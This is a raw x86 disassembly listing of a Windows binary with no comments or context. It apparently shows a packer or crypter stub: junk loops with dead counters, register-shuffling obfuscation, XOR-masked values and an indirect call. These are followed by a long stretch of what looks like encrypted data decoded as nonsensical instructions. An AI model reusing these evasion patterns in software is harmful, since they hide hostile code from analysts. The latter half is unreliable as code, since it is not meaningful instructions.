  4051ac:	mov    eax,ds:0x42d00c
  4051b1:	inc    eax
  4051b2:	mov    ds:0x42d00c,eax
  4051b7:	cmp    DWORD PTR ds:0x42d00c,0x1b
  4051be:	jae    0x405206
  4051c4:	cmp    DWORD PTR ds:0x42d00c,0xd
  4051cb:	jne    0x4051dc
  4051d1:	push   0x42e0b3
  4051d6:	call   DWORD PTR ds:0x42e9cb
  4051dc:	cmp    DWORD PTR ds:0x42d00c,0xc
  4051e3:	jne    0x4051f7
  4051e9:	xor    eax,eax
  4051eb:	xor    eax,DWORD PTR ds:0x42d00c
  4051f1:	inc    eax
  4051f2:	mov    ds:0x42d00c,eax
  4051f7:	jmp    0x4051ac
  4051fc:	xor    DWORD PTR ds:0x42b010,0x429024
  405206:	mov    DWORD PTR [ebp-0x30],ecx
  405209:	mov    eax,DWORD PTR [ebp-0x4]
  40520c:	mov    ecx,DWORD PTR [ebp-0x30]
  40520f:	xor    eax,esi
  405211:	add    eax,edi
  405213:	cmp    ecx,eax
  405215:	je     0x405253
  40521b:	jmp    0x405244
  405220:	mov    eax,DWORD PTR [ebp-0x4]
  405223:	mov    ecx,DWORD PTR [ebp-0x8]
  405226:	xor    eax,esi
  405228:	add    eax,edi
  40522a:	cmp    ecx,eax
  40522c:	mov    eax,DWORD PTR [ebp-0x4]
  40522f:	je     0x40528e
  405235:	mov    ecx,DWORD PTR [ebp-0x38]
  405238:	xor    eax,esi
  40523a:	add    eax,edi
  40523c:	cmp    ecx,eax
  40523e:	je     0x405297
  405244:	lea    eax,[ebp-0x8]
  405247:	push   eax
  405248:	push   DWORD PTR [ebp-0x30]
  40524b:	push   DWORD PTR [ebp+0xc]
  40524e:	call   0x40ca0a
  405253:	mov    eax,DWORD PTR [ebp-0x4]
  405256:	mov    ecx,DWORD PTR [ebp-0x8]
  405259:	xor    eax,esi
  40525b:	add    eax,edi
  40525d:	cmp    ecx,eax
  40525f:	je     0x40527a
  405265:	mov    eax,DWORD PTR [ebp-0x3c]
  405268:	movzx  eax,WORD PTR [eax+ebx*2]
  40526c:	mov    ecx,DWORD PTR [ebp-0x14]
  40526f:	mov    eax,DWORD PTR [ecx+eax*4]
  405272:	mov    DWORD PTR [ebp-0x40],eax
  405275:	jmp    0x405220
  40527a:	mov    eax,DWORD PTR [ebp-0xc]
  40527d:	xor    eax,esi
  40527f:	lea    ebx,[ebx+eax*1+0x3272e0]
  405286:	jmp    0x402be0
  40528b:	mov    eax,DWORD PTR [ebp-0x4]
  40528e:	xor    eax,esi
  405290:	add    eax,edi
  405292:	jmp    0x4053b4
  405297:	mov    eax,DWORD PTR [ebp-0x40]
  40529a:	add    eax,DWORD PTR [ebp+0x8]
  40529d:	mov    DWORD PTR [ebp-0x18],eax
  4052a0:	mov    eax,DWORD PTR [ebp-0x1c]
  4052a3:	test   eax,eax
  4052a5:	je     0x40533f
  4052ab:	mov    DWORD PTR [ebp-0x28],0x0
  4052b2:	push   0x3
  4052b4:	xor    edx,edx
  4052b6:	pop    edx
  4052b7:	add    edx,0x8
  4052ba:	push   edx
  4052bb:	pop    ecx
  4052bc:	push   0x6
  4052be:	dec    ecx
  4052bf:	pop    ebx
  4052c0:	dec    ebx
  4052c1:	xchg   ebx,ecx
  4052c3:	sub    ebx,ecx
  4052c5:	xchg   ebx,ecx
  4052c7:	dec    ecx
  4052c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052cb:	imul   eax,ecx
  4052ce:	sub    esp,eax
  4052d0:	mov    DWORD PTR [ebp-0x28],esp
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x405318
  4052df:	mov    ecx,DWORD PTR [ebp-0xc]
  4052e2:	mov    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    edx,DWORD PTR [ebp+0x14]
  4052e8:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052ec:	xor    ecx,esi
  4052ee:	add    ecx,edi
  4052f0:	xor    edx,edx
  4052f2:	div    ecx
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	xor    ecx,esi
  4052f9:	lea    eax,[ecx+eax*1+0x3272e0]
  405300:	mov    ecx,DWORD PTR [ebp+0x8]
  405303:	mov    edx,DWORD PTR [ebp-0x28]
  405306:	mov    DWORD PTR [edx+ecx*4],eax
  405309:	mov    eax,DWORD PTR [ebp-0xc]
  40530c:	mov    ecx,DWORD PTR [ebp+0x8]
  40530f:	xor    eax,esi
  405311:	lea    eax,[eax+ecx*1+0x3272e0]
  405318:	mov    DWORD PTR [ebp+0x8],eax
  40531b:	mov    eax,DWORD PTR [ebp-0xc]
  40531e:	mov    ecx,DWORD PTR [ebp+0x14]
  405321:	xor    eax,esi
  405323:	add    eax,edi
  405325:	imul   eax,DWORD PTR [ecx]
  405328:	mov    ecx,DWORD PTR [ebp-0x4]
  40532b:	mov    edx,DWORD PTR [ebp+0x8]
  40532e:	xor    ecx,esi
  405330:	lea    ecx,[ecx+edx*1+0x3272e0]
  405337:	cmp    ecx,eax
  405339:	jne    0x4052df
  40533f:	mov    eax,DWORD PTR [ebp-0x4]
  405342:	xor    eax,esi
  405344:	add    eax,edi
  405346:	mov    DWORD PTR [ebp-0x10],eax
  405349:	mov    ebx,0x65655
  40534e:	add    ebx,0x3234
  405354:	xchg   ebx,esi
  405356:	xor    ebx,ebx
  405358:	push   esi
  405359:	mov    esi,ebx
  40535b:	pop    ebx
  40535c:	mov    edx,esi
  40535e:	add    ebx,0x1002
  405364:	lea    eax,[ebp-0x18]
  405367:	add    edx,eax
  405369:	add    edx,0x5
  40536c:	push   edx
  40536d:	inc    esi
  40536e:	pop    ecx
  40536f:	dec    ecx
  405370:	xchg   ecx,eax
  405371:	dec    eax
  405372:	xchg   ecx,eax
  405373:	dec    ecx
  405374:	xchg   ecx,edx
  405376:	dec    edx
  405377:	push   edx
  405378:	mov    edx,ebx
  40537a:	pop    ebx
  40537b:	dec    ebx
  40537c:	call   DWORD PTR [ebx]
  40537e:	cmp    DWORD PTR [ebp+0x10],esi
  405381:	je     0x4053a0
  405387:	xchg   edx,eax
  405388:	push   0xb
  40538a:	pop    ecx
  40538b:	push   0x4
  40538d:	pop    ebx
  40538e:	inc    ebx
  40538f:	xchg   ebx,ecx
  405391:	sub    ebx,ecx
  405393:	xchg   ebx,ecx
  405395:	dec    ecx
  405396:	dec    ecx
  405397:	mov    eax,DWORD PTR [ebp-0x1c]
  40539a:	imul   eax,ecx
  40539d:	add    esp,eax
  40539f:	xchg   edx,eax
  4053a0:	push   eax
  4053a1:	xor    ebx,ebx
  4053a3:	mov    edx,esp
  4053a5:	dec    edx
  4053a6:	inc    ebx
  4053a7:	add    ebx,DWORD PTR [edx+ebx*1]
  4053aa:	dec    ebx
  4053ab:	xor    edx,edx
  4053ad:	add    DWORD PTR [ebp-0x10],ebx
  4053b0:	pop    ebx
  4053b1:	mov    eax,DWORD PTR [ebp-0x10]
  4053b4:	pop    edi
  4053b5:	pop    esi
  4053b6:	pop    ebx
  4053b7:	leave  
  4053b8:	ret    0x10
  4053bb:	push   ebp
  4053bc:	mov    ebp,esp
  4053be:	sub    esp,0x7c
  4053c1:	mov    eax,ds:0x42a000
  4053c6:	xor    eax,DWORD PTR ds:0x42c014
  4053cc:	mov    ds:0x42a000,eax
  4053d1:	push   esi
  4053d2:	and    DWORD PTR ds:0x42a004,0x0
  4053dc:	jmp    0x4053f0
  4053e1:	xor    esi,esi
  4053e3:	or     esi,DWORD PTR ds:0x42a004
  4053e9:	inc    esi
  4053ea:	mov    DWORD PTR ds:0x42a004,esi
  4053f0:	cmp    DWORD PTR ds:0x42a004,0x18
  4053f7:	jae    0x4054e8
  4053fd:	cmp    DWORD PTR ds:0x42a004,0x6
  405404:	jne    0x405415
  40540a:	push   0x429028
  40540f:	call   DWORD PTR ds:0x42e9d3
  405415:	cmp    DWORD PTR ds:0x42a004,0x5
  40541c:	jne    0x405431
  405422:	xor    esi,esi
  405424:	or     esi,DWORD PTR ds:0x42a004
  40542a:	inc    esi
  40542b:	mov    DWORD PTR ds:0x42a004,esi
  405431:	jmp    0x4053e1
  405436:	and    DWORD PTR ds:0x42a014,0x0
  405440:	jmp    0x405454
  405445:	xor    esi,esi
  405447:	or     esi,DWORD PTR ds:0x42a014
  40544d:	inc    esi
  40544e:	mov    DWORD PTR ds:0x42a014,esi
  405454:	cmp    DWORD PTR ds:0x42a014,0x19
  40545b:	jae    0x4054e8
  405461:	cmp    DWORD PTR ds:0x42a014,0xf
  405468:	jne    0x405483
  40546e:	push   0x42d01c
  405473:	push   0x42a00c
  405478:	push   0x42d010
  40547d:	call   DWORD PTR ds:0x42e993
  405483:	cmp    DWORD PTR ds:0x42a014,0xe
  40548a:	jne    0x40549d
  405490:	mov    esi,DWORD PTR ds:0x42a014
  405496:	inc    esi
  405497:	mov    DWORD PTR ds:0x42a014,esi
  40549d:	jmp    0x405445
  4054a2:	mov    DWORD PTR ds:0x42c010,0x19
  4054ac:	cmp    DWORD PTR ds:0x42c010,0x0
  4054b3:	je     0x4054e8
  4054b9:	cmp    DWORD PTR ds:0x42c010,0x1e
  4054c0:	jne    0x4054d6
  4054c6:	push   0x0
  4054c8:	push   0x13e0
  4054cd:	push   DWORD PTR [ebp-0x14]
  4054d0:	call   DWORD PTR ds:0x42e997
  4054d6:	mov    esi,DWORD PTR ds:0x42c010
  4054dc:	dec    esi
  4054dd:	mov    DWORD PTR ds:0x42c010,esi
  4054e3:	jmp    0x4054ac
  4054e8:	push   edi
  4054e9:	adc    DWORD PTR ds:0x42901c,edx
  4054ef:	mov    eax,ds:0x42e313
  4054f4:	mov    esi,DWORD PTR ds:0x42c01c
  4054fa:	and    DWORD PTR ds:0x42a00c,esi
  405500:	mov    DWORD PTR [ebp-0x24],eax
  405503:	mov    eax,ds:0x42e41f
  405508:	mov    DWORD PTR [ebp-0x34],eax
  40550b:	mov    DWORD PTR ds:0x42b008,0x1b
  405515:	cmp    DWORD PTR ds:0x42b008,0x0
  40551c:	je     0x405564
  405522:	cmp    DWORD PTR ds:0x42b008,0x26
  405529:	jne    0x405554
  40552f:	push   0x5039
  405534:	push   DWORD PTR [ebp-0x20]
  405537:	push   0x42d010
  40553c:	push   0x88e6
  405541:	push   DWORD PTR [ebp-0x10]
  405544:	push   0x8f04
  405549:	push   0x8b34
  40554e:	call   DWORD PTR ds:0x42e99f
  405554:	mov    eax,ds:0x42b008
  405559:	dec    eax
  40555a:	mov    ds:0x42b008,eax
  40555f:	jmp    0x405515
  405564:	and    DWORD PTR [ebp-0x30],0x0
  405568:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  40556f:	add    eax,eax
  405571:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  405578:	add    DWORD PTR ds:0x42c014,edi
  40557e:	mov    eax,DWORD PTR [ebp-0x10]
  405581:	and    DWORD PTR ds:0x42d014,0x0
  40558b:	mov    esi,DWORD PTR ds:0x42d014
  405591:	inc    esi
  405592:	mov    DWORD PTR ds:0x42d014,esi
  405598:	cmp    DWORD PTR ds:0x42d014,0x5
  40559f:	jne    0x4055c0
  4055a5:	push   0x42c004
  4055aa:	push   DWORD PTR [ebp-0x20]
  4055ad:	push   0x42e0c7
  4055b2:	push   DWORD PTR [ebp-0x24]
  4055b5:	push   0x31c8
  4055ba:	call   DWORD PTR ds:0x42e9a3
  4055c0:	cmp    DWORD PTR ds:0x42d014,0x4
  4055c7:	jne    0x4055dc
  4055cd:	xor    esi,esi
  4055cf:	xor    esi,DWORD PTR ds:0x42d014
  4055d5:	inc    esi
  4055d6:	mov    DWORD PTR ds:0x42d014,esi
  4055dc:	cmp    DWORD PTR ds:0x42d014,0x1c
  4055e3:	jb     0x40558b
  4055e9:	and    DWORD PTR ds:0x42c004,0x0
  4055f3:	xor    ecx,ecx
  4055f5:	xor    ecx,DWORD PTR ds:0x42c004
  4055fb:	inc    ecx
  4055fc:	mov    DWORD PTR ds:0x42c004,ecx
  405602:	cmp    DWORD PTR ds:0x42c004,0x28
  405609:	jne    0x40561a
  40560f:	push   0x42d010
  405614:	call   DWORD PTR ds:0x42e9ab
  40561a:	cmp    DWORD PTR ds:0x42c004,0x18
  405621:	jb     0x4055f3
  405627:	and    DWORD PTR ds:0x42c018,edx
  40562d:	mov    ecx,DWORD PTR [ebp-0x10]
  405630:	sub    eax,ecx
  405632:	mov    DWORD PTR [ebp-0x10],eax
  405635:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  40563c:	mov    eax,DWORD PTR [ebp-0x18]
  40563f:	mov    ecx,DWORD PTR [ebp-0x18]
  405642:	sub    eax,ecx
  405644:	mov    DWORD PTR [ebp-0x18],eax
  405647:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  40564e:	jmp    0x4079f8
  405653:	neg    DWORD PTR [edi+0x51]
  405656:	pop    ds
  405657:	adc    edi,esi
  405659:	div    DWORD PTR [edi]
  40565b:	jge    0x40560a
  40565d:	aam    0xe9
  40565f:	nop
  405660:	fisttp QWORD PTR [eax]
  405662:	popa   
  405663:	xor    BYTE PTR [edi+0x7a],bl
  405666:	jp     0x40564d
  405668:	pop    edi
  405669:	jp     0x4056e5
  40566b:	add    eax,0x98497546
  405670:	outs   dx,DWORD PTR ds:[esi]
  405671:	aam    0x7e
  405673:	loopne 0x40569f
  405675:	xchg   ebx,eax
  405676:	ret    
  405677:	mov    ds:0x6c1b749c,al
  40567c:	aaa    
  40567d:	inc    edx
  40567e:	sbb    bh,BYTE PTR [edx]
  405680:	sbb    DWORD PTR [esi],esp
  405682:	xor    dh,BYTE PTR [ecx+esi*4+0x4a]
  405686:	cmc    
  405687:	cmp    WORD PTR [edi-0xb],0x96e7
  40568d:	inc    edi
  40568e:	push   ebp
  40568f:	leave  
  405690:	or     cl,0xae
  405693:	jmp    FWORD PTR [esi-0xc]
  405696:	xchg   edx,eax
  405697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405698:	scas   eax,DWORD PTR es:[edi]
  405699:	int    0xee
  40569b:	aaa    
  40569c:	ins    BYTE PTR es:[edi],dx
  40569d:	call   esp
  40569f:	fimul  WORD PTR [ebp+0x38]
  4056a2:	shl    DWORD PTR [edx+0x9eaf495],0xdd
  4056a9:	push   es
  4056aa:	or     bl,BYTE PTR [edx]
  4056ac:	ds ss fwait
  4056af:	xchg   si,ax
  4056b1:	jne    0x405715
  4056b3:	mov    BYTE PTR [eax-0x3ff87fe7],dl
  4056b9:	bound  edx,QWORD PTR [ebp-0x4e]
  4056bc:	(bad)  
  4056bd:	imul   DWORD PTR es:[ecx+0x62ced723]
  4056c4:	dec    DWORD PTR [ebp-0x23]
  4056c7:	pushf  
  4056c8:	add    BYTE PTR [ecx-0x22],0xaf
  4056cc:	sbb    BYTE PTR [ecx],0xb6
  4056cf:	scas   eax,DWORD PTR es:[edi]
  4056d0:	push   ebp
  4056d1:	bound  ebx,QWORD PTR [ecx+0x79]
  4056d4:	aaa    
  4056d5:	es xor al,0xd9
  4056d8:	pop    ss
  4056d9:	mov    eax,0x35838ddd
  4056de:	push   ds
  4056df:	fisub  DWORD PTR ds:[eax]
  4056e2:	mov    dh,BYTE PTR [esi+0x5c]
  4056e5:	mov    ds:0x45ff7887,al
  4056ea:	or     esi,DWORD PTR [ecx+0xaba6602]
  4056f0:	jle    0x4056a7
  4056f2:	(bad)  
  4056f3:	aam    0x95
  4056f5:	push   eax
  4056f6:	scas   eax,DWORD PTR es:[edi]
  4056f7:	popf   
  4056f8:	pop    edx
  4056f9:	jp     0x4056f2
  4056fb:	ret    0x228f
  4056fe:	pop    ecx
  4056ff:	adc    al,0xfb
  405701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405702:	repnz out 0x28,eax
  405705:	xor    bh,al
  405707:	popa   
  405708:	mov    ebp,DWORD PTR [eax]
  40570a:	ins    BYTE PTR es:[edi],dx
  40570b:	inc    eax
  40570c:	xor    eax,0x25464349
  405711:	(bad)  
  405712:	frstor [ebx+0x45]
  405715:	ds xor al,0xc9
  405718:	aas    
  405719:	ins    BYTE PTR es:[edi],dx
  40571a:	enter  0xaec7,0xa2
  40571e:	(bad)  
  40571f:	dec    esp
  405720:	pop    esp
  405721:	push   es
  405722:	xor    dl,BYTE PTR [eax+0x3ac7a227]
  405728:	or     al,0x7a
  40572a:	stos   DWORD PTR es:[edi],eax
  40572b:	inc    eax
  40572c:	and    eax,0x57b0f347
  405731:	add    ecx,ebp
  405733:	jo     0x4056fe
  405735:	fistp  WORD PTR ds:0x32d33c6b
  40573b:	dec    edi
  40573c:	pop    edi
  40573d:	cmp    dl,BYTE PTR [ebx-0x11]
  405740:	pxor   mm5,mm6
  405743:	lds    esp,FWORD PTR [eax]
  405745:	daa    
  405746:	sub    eax,0xc7b0918b
  40574b:	out    dx,eax
  40574c:	xor    DWORD PTR [edi-0x7b26e0d4],0xedbf2c1
  405756:	aas    
  405757:	(bad)  
  405758:	fcomp  DWORD PTR [edx]
  40575a:	push   edx
  40575b:	mov    dl,0x1d
  40575d:	jbe    0x4056ec
  40575f:	(bad)
  405763:	stos   BYTE PTR es:[edi],al
  405764:	sub    ebx,DWORD PTR [ebp-0x2b]
  405767:	mov    esp,0xd3aad911
  40576c:	fadd   DWORD PTR [ebp-0x3a42bb55]
  405772:	pop    ebp
  405773:	sbb    al,0x98
  405775:	xchg   esi,eax
  405776:	ret    
  405777:	push   ebp
  405778:	sbb    BYTE PTR [ebp+0x9],cl
  40577b:	push   ebp
  40577c:	(bad)  [ecx+0x6b]
  40577f:	popf   
  405780:	sbb    al,0x6e
  405782:	inc    ecx
  405783:	repnz test DWORD PTR [eax+0x56],0xd710be45
  40578b:	sbb    edi,DWORD PTR [edi+0x2c]
  40578e:	fld    DWORD PTR [esp+eax*4+0x53]
  405792:	xor    esp,ebx
  405794:	cld    
  405795:	cdq    
  405796:	iret   
  405797:	enter  0x862a,0x11
  40579b:	call   0xcd6a:0x265a6254
  4057a2:	mov    ebx,0x82df89b7
  4057a7:	dec    ebp
  4057a8:	push   edx
  4057a9:	push   0xade98d9d
  4057ae:	pop    ds
  4057af:	stos   DWORD PTR es:[edi],eax
  4057b0:	call   0x85e2:0x9d2f7ee8
  4057b7:	std    
  4057b8:	inc    ecx
  4057b9:	mov    dl,0xd8
  4057bb:	xor    al,0x4
  4057bd:	jp     0x4057c7
  4057bf:	and    bl,cl
  4057c1:	sub    al,0x82
  4057c3:	mov    ch,bh
  4057c5:	xor    edx,DWORD PTR [eax-0x9]
  4057c8:	or     bl,BYTE PTR [edi+0x166eacaa]
  4057ce:	mov    dl,al
  4057d0:	ds in  eax,dx
  4057d2:	mov    DWORD PTR [ebx+0x4527d208],edi
  4057d8:	out    0x0,al
  4057da:	(bad)  
  4057db:	push   ds
  4057dc:	add    DWORD PTR [ecx-0x5b],ebp
  4057df:	mov    ch,0x8d
  4057e1:	or     DWORD PTR [eax+0x1a7089a0],esi
  4057e7:	out    dx,al
  4057e8:	mov    dl,0x20
  4057ea:	jb     0x40582f
  4057ec:	fidivr DWORD PTR [edi-0xb]
  4057ef:	push   es
  4057f0:	mov    ds:0x725ae185,al
  4057f5:	pop    DWORD PTR [ebp+0x2d569514]
  4057fb:	push   ss
  4057fc:	adc    al,0x84
  4057fe:	out    0x51,al
  405800:	mov    ds:0x8f7e936a,eax
  405805:	in     al,dx
  405806:	nop
  405807:	in     al,0x3a
  405809:	pusha  
  40580a:	rcr    dh,0x32
  40580d:	inc    edx
  40580e:	jl     0x405820
  405810:	mov    ecx,0x7b911138
  405815:	das    
  405816:	aaa    
  405817:	mov    ebp,cs
  405819:	or     edx,0x9
  40581c:	sub    DWORD PTR [edx],esp
  40581e:	cmp    BYTE PTR [ebx+0x64],0x80
  405822:	xchg   edi,eax
  405823:	ror    BYTE PTR [edi+0x46],cl
  405826:	lock out dx,al
  405828:	adc    al,0x5f
  40582a:	shr    bl,0xa8
  40582d:	mov    ebx,0x3a1f7600
  405832:	iret   
  405833:	jns    0x4057c4
  405835:	sbb    edi,DWORD PTR [ebp-0x314dd556]
  40583b:	mov    ecx,0xdb902c60
  405840:	sub    al,0x18
  405842:	inc    edx
  405843:	iret   
  405844:	mov    esi,0xff295d24
  405849:	fisttp WORD PTR [eax]
  40584b:	jp     0x405827
  40584d:	push   ds
  40584e:	add    ebp,DWORD PTR [eax+edx*8-0x52ec13bc]
  405855:	repz js 0x405899
  405858:	ins    DWORD PTR es:[edi],dx
  405859:	push   ecx
  40585a:	and    eax,0x913dce01
  40585f:	repnz enter 0x7dea,0xef
  405864:	iret   
  405865:	(bad)  
  405866:	idiv   dh
  405868:	mov    ebp,0x35c48f29
  40586d:	or     esp,DWORD PTR [ecx-0x7b905e1b]
  405873:	imul   ebp,DWORD PTR [esi+0x27],0x2f1b56d0
  40587a:	push   esp
  40587b:	(bad)  
  40587c:	or     BYTE PTR [edi],cl
  40587e:	pop    ecx
  40587f:	sub    edx,DWORD PTR [ebx+0x5ff325fa]
  405885:	sbb    edi,eax
  405887:	int3   
  405888:	or     ch,BYTE PTR [esi-0x4d0e7ad7]
  40588e:	mul    BYTE PTR [esi]
  405890:	mov    ebx,DWORD PTR [esi+0x135856c9]
  405896:	mov    BYTE PTR [ebp+esi*2+0xc03fd93],dh
  40589d:	jbe    0x405845
  40589f:	cdq    
  4058a0:	and    eax,0xc8e1574
  4058a5:	dec    ecx
  4058a6:	dec    edx
  4058a7:	stos   DWORD PTR es:[edi],eax
  4058a8:	jo     0x4058a7
  4058aa:	jb     0x405836
  4058ac:	(bad)  [esi-0x18]
  4058af:	imul   ecx,esp,0x9
  4058b2:	cdq    
  4058b3:	outs   dx,BYTE PTR ds:[esi]
  4058b4:	jge    0x405883
  4058b6:	out    0xc,al
  4058b8:	in     eax,0xaf
  4058ba:	jns    0x4058d7
  4058bc:	shr    DWORD PTR [esi+0x1b],cl
  4058bf:	inc    eax
  4058c0:	xor    DWORD PTR [esi+0x3d5b15a4],esi
  4058c6:	jbe    0x405891
  4058c8:	jle    0x4058ae
  4058ca:	les    ecx,FWORD PTR [edx]
  4058cc:	jno    0x40593d
  4058ce:	adc    BYTE PTR [ebx-0x5c],bl
  4058d1:	lods   eax,DWORD PTR ds:[esi]
  4058d2:	or     bl,dh
  4058d4:	mov    DWORD PTR [edx-0x34],ebx
  4058d7:	out    0x60,eax
  4058d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058da:	or     BYTE PTR [ebx],al
  4058dc:	outs   dx,DWORD PTR ds:[esi]
  4058dd:	adc    esp,eax
  4058df:	clc    
  4058e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058e1:	int3   
  4058e2:	icebp  
  4058e3:	fs pop ebp
  4058e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058e6:	dec    BYTE PTR [ecx-0x1a58d3cb]
  4058ec:	aas    
  4058ed:	cmp    ch,BYTE PTR [eax]
  4058ef:	loopne 0x4058df
  4058f1:	fnstenv [ebx+0x7ba85ae]
  4058f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058f8:	pop    ebp
  4058f9:	fcmovnu st,st(0)
  4058fb:	jmp    0x4058be
  4058fd:	push   ecx
  4058fe:	(bad)  
  4058ff:	mov    ch,0x2e
  405901:	pop    esi
  405902:	retf   
  405903:	mov    WORD PTR [ecx-0x78],es
  405906:	push   ecx
  405907:	xor    DWORD PTR [ecx+eiz*1],ebp
  40590a:	les    ebx,FWORD PTR [ebp+0x12]
  40590d:	lea    esi,[edx]
  40590f:	mov    ah,0xa8
  405911:	test   dh,al
  405913:	dec    esi
  405914:	mov    esi,0x73762f34
  405919:	lea    eax,[ebp+0x62]
  40591c:	lds    edx,FWORD PTR [ecx+edi*8-0xb0b0858]
  405923:	lock jg 0x405968
  405926:	push   ecx
  405927:	js     0x405952
  405929:	xchg   ebx,eax
  40592a:	xchg   esi,eax
  40592b:	inc    ebp
  40592c:	cmp    ecx,edi
  40592e:	inc    edi
  40592f:	and    dh,bl
  405931:	into   
  405932:	imul   ebp,esi,0x63
  405935:	sub    BYTE PTR [esp+edi*1],ah
  405938:	nop
  405939:	and    al,ch
  40593b:	mov    al,0xd7
  40593d:	and    eax,0xe755331e
  405942:	jecxz  0x405924
  405944:	pop    es
  405945:	xor    DWORD PTR [esi],0xffffff92
  405948:	jno    0x405900
  40594a:	push   eax
  40594b:	stos   DWORD PTR es:[edi],eax
  40594c:	mov    dl,0x9b
  40594e:	stos   BYTE PTR es:[edi],al
  40594f:	in     eax,dx
  405950:	mov    ebp,0x53a07dbf
  405955:	sbb    DWORD PTR [esi],ebx
  405957:	dec    eax
  405958:	lock cmp ah,BYTE PTR [ecx+0x5c]
  40595c:	cmp    al,0xd5
  40595e:	cmp    BYTE PTR [esi+0x7f],ch
  405961:	mov    DWORD PTR [ebp+0x25bafc06],edx
  405967:	cdq    
  405968:	test   DWORD PTR [edi-0xb],ecx
  40596b:	jp     0x40592e
  40596d:	mov    al,ds:0x285b3caf
  405972:	std    
  405973:	test   eax,0x73da8760
  405978:	cmp    ebp,ecx
  40597a:	enter  0x35ce,0x1b
  40597e:	mov    cl,0x93
  405980:	cmc    
  405981:	mov    ebp,0xda03c520
  405986:	adc    eax,0x74d99349
  40598b:	push   0x1c1fbcf6
  405990:	mov    bh,0xe6
  405992:	shl    BYTE PTR [ecx],cl
  405994:	iret   
  405995:	add    al,0x66
  405997:	jecxz  0x4059b4
  405999:	inc    ebp
  40599a:	pop    ebx
  40599b:	dec    eax
  40599c:	mov    dl,dh
  40599e:	dec    edx
  40599f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a0:	aaa    
  4059a1:	pop    ds
  4059a2:	cmp    DWORD PTR [ebx],0x8ee23fcd
  4059a8:	imul   ebx,eax,0x16846da5
  4059ae:	dec    ebx
  4059af:	xor    DWORD PTR [edx+0x4e],edx
  4059b2:	jnp    0x405949
  4059b4:	wbinvd 
  4059b6:	daa    
  4059b7:	pop    ebx
  4059b8:	jecxz  0x405a35
  4059ba:	mov    ecx,0x45ec3f1e
  4059bf:	call   0x24c277c5
  4059c4:	pushf  
  4059c5:	ret    0xb3d
  4059c8:	fistp  DWORD PTR ds:0xf2c5ed5d
  4059ce:	jb     0x40597c
  4059d0:	inc    ebp
  4059d1:	shl    BYTE PTR [eax+0x475c07a7],cl
  4059d7:	lods   al,BYTE PTR ds:[esi]
  4059d8:	and    DWORD PTR [edi-0x1b7d8850],0x2c9405a2
  4059e2:	outs   dx,BYTE PTR ds:[esi]
  4059e3:	repnz fidiv WORD PTR [ebx-0x41]
  4059e7:	adc    al,0x40
  4059e9:	push   es
  4059ea:	sub    edx,DWORD PTR [edx-0x1eea02a8]
  4059f0:	or     eax,0xc0e6d868
  4059f5:	call   FWORD PTR [edi-0x1e]
  4059f8:	xor    eax,0xd6ab3dbc
  4059fd:	mov    ch,ch
  4059ff:	pop    edx
  405a00:	out    0xbf,eax
  405a02:	pushf  
  405a03:	test   BYTE PTR [esi-0x68e56bf3],ch
  405a09:	xor    DWORD PTR [esi+ecx*1+0xf3cea24],eax
  405a10:	loopne 0x405a08
  405a12:	pushf  
  405a13:	(bad)  
  405a14:	pop    ecx
  405a15:	loop   0x405a76
  405a17:	ins    BYTE PTR es:[edi],dx
  405a18:	in     al,dx
  405a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a1a:	pop    edi
  405a1b:	jae    0x4059dc
  405a1d:	je     0x4059f5
  405a1f:	mul    BYTE PTR [esi+edi*1-0xf]
  405a23:	es fwait
  405a25:	imul   esi,DWORD PTR [edi+0x4f1fa123],0x7a8ddf5
  405a2f:	cmp    eax,0xf0937bd3
  405a34:	js     0x405a02
  405a36:	add    DWORD PTR [eax+0x43a4fd98],0x5ae0045b
  405a40:	jmp    0xb9b6:0xf624b495
  405a47:	(bad)  
  405a48:	aas    
  405a49:	pop    ebx
  405a4a:	mov    al,ds:0x59b7feea
  405a4f:	retf   
  405a50:	or     al,al
  405a52:	aad    0x74
  405a54:	ret    0x5828
  405a57:	ret    0x7008
  405a5a:	lahf   
  405a5b:	add    BYTE PTR [ebx],bl
  405a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a5e:	pop    eax
  405a5f:	or     esi,esi
  405a61:	je     0x405aa6
  405a63:	popf   
  405a64:	and    dl,ah
  405a66:	shr    BYTE PTR [eax+0x6c],1
  405a69:	mov    DWORD PTR [ebx-0x490bda24],esp
  405a6f:	rol    BYTE PTR [eax],0x4f
  405a72:	mov    eax,ds:0xef45fd9e
  405a77:	jg     0x405a58
  405a79:	clc    
  405a7a:	(bad)  
  405a7c:	and    eax,0xda5eb5c5
  405a81:	jae    0x405acc
  405a83:	jb     0x405a54
  405a85:	into   
  405a86:	(bad)  
  405a87:	not    BYTE PTR [ebx+0x2a]
  405a8a:	add    eax,0x3a1c66ae
  405a8f:	mov    cl,0xeb
  405a91:	arpl   WORD PTR ds:0xd069fc14,sp
  405a97:	jp     0x405a60
  405a99:	mov    esi,0x2dbb5d58
  405a9e:	ficom  DWORD PTR ds:0x334e6816
  405aa4:	rcl    BYTE PTR ds:0xc8a48fa2,1
  405aaa:	lods   eax,DWORD PTR ds:[esi]
  405aab:	popf   
  405aac:	jbe    0x405a36
  405aae:	call   DWORD PTR [ebp-0x3f84c051]
  405ab4:	jmp    0xc466008c
  405ab9:	int    0xb3
  405abb:	in     al,0x80
  405abd:	test   DWORD PTR [ebp-0x3537ebf8],esp
  405ac3:	cdq    
  405ac4:	adc    al,0x84
  405ac6:	or     BYTE PTR [ebp+0x50],al
  405ac9:	xchg   edi,eax
